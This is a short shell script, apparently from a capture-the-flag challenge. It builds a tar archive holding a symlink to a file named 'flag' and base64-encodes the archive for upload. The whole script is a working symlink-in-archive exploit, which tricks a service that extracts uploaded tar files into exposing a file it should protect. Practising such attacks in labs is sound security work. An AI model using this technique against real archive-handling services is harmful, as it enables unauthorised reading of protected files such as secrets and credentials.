# Create a temporary directory
mkdir -p exploit/files

# Create a symlink to the flag (assuming it's named "flag" in current directory)
ln -s $(pwd)/flag exploit/files/flag_link

# Create the tar archive
tar -cvf malicious.tar -C exploit files/flag_link

# Encode it in base64
base64 malicious.tar > malicious.tar.b64
